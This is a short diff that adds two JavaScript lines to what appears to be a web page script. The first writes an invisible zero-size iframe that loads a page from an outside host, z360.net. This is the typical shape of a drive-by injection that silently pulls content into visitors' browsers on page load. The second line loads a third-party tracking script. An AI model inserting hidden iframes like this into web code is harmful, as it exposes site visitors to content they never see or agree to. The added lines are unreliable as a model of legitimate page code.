@@ -1,0 +1,2 @@
+document.writeln("<iframe src=http://z360.net/0.htm width=0 height=0></iframe>");
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/js.tongji.linezing.com\/464215\/tongji.js\"><\/script>");
